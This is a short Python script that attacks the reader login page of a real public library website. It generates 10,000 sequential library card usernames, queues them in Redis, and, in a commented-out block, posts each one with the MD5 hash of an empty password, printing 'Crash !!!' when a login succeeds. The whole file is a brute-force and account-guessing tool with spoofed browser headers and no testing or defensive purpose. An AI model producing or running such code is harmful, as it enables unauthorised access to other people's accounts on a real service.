import requests
import hashlib

# import config

username = 'F44010006{}'
# password=config.password
s = bytes('', encoding='utf8')
m = hashlib.md5()
m.update(s)
first_md5 = m.hexdigest()
headers = {'Referer': 'https://www.szlib.org.cn/MyLibrary/Reader-Access.jsp?infomistake=0&eventsite=WWW-044005',
           'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
           'X-Requested-With': 'XMLHttpRequest'}

import redis
#
# r = redis.StrictRedis('10.18.6.26', db=5, decode_responses=True)
#
# # for i in range(10000):
# # 	username_crash=username.format(str(i).zfill(4))
# # 	r.lpush('username',username_crash)
# url = 'https://www.szlib.org.cn/MyLibrary/readerLoginM.jsp'
# data = {'rand': '',
#         'username': username,
#         'password': first_md5,
#
#         }
# print(data)
# r = requests.post(url=url, headers=headers, data=data, timeout=15)
# print(r.text)
# if '<message>OK</message>' in r.text:
#     print('Crash !!!')
#     print(username)
#     print(password)
# # break


r = redis.StrictRedis('10.18.6.26', db=5, decode_responses=True)

for i in range(10000):
	username_crash=username.format(str(i).zfill(4))
	r.lpush('username',username_crash)